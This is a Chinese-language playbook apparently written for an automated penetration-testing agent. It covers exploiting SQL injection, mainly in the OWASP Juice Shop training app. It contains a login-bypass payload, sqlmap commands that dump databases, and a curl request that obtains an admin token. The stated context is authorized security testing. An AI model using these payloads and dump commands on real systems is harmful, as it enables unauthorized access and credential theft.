# 知识包：SQL 注入利用

目标不是"确认有注入"，而是**利用它拿到访问或数据**（认证绕过拿 token、dump 凭据）。

## 快速判断
- 参数注入单引号 `'` 看是否报错（`SQLITE_ERROR` / `SQL syntax` / `near "..."`）。
- 登录框试认证绕过：`email=' OR 1=1--`，password 任意。

## 利用（拿战果）
- sqlmap 自动化（授权目标）：
  - 查询参数：`sqlmap -u '<url>?q=1' --batch --level 3 --risk 2 --dump`
  - JSON body：`sqlmap -u <url> --data '{"email":"x","password":"y"}' --headers='Content-Type: application/json' --batch --dump`
- 手工认证绕过（更快）：直接 `curl` 发注入 payload，看是否返回登录 token。

## Juice Shop 典型
- `POST /rest/user/login`，JSON `{"email":"' OR 1=1--","password":"x"}` → 返回 admin 的 `authentication.token`（= web_admin 立足点）。
  验证：`curl -s -X POST <target>/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"x"}'`
- `GET /rest/products/search?q=` → UNION/报错注入，可 dump 其他表。

## 登记
- 拿到登录 token/session → `report_foothold(access_level=web_user 或 web_admin, evidence=真实响应片段)`
- dump 到用户名+hash → `report_credential(kind=hash, ...)`；dump 到数据 → `report_loot`
**证据纪律**：登记前确认响应里真有 token/数据，不要凭猜。

## 带上 replay（引擎会主动确定性验证，强烈建议）
report_foothold 填 `replay`，引擎会用自选标记/挑战经该注入点回环坐实（报错型/union 带回引擎 nonce/认证绕过差分），比叙述可靠：
- `replay={"probe_type":"sqli","url":"<target>/rest/products/search","param":"q","method":"GET"}`
- JSON body 注入：`replay={"probe_type":"sqli","url":"<target>/rest/user/login","param":"email","method":"POST","injection":"json_body","base_params":{"password":"x"}}`
> 注意：**回显 payload 字符串不算证据**（那是反射不是注入）；引擎验不出会判 unproven（不冤枉也不冒充）。
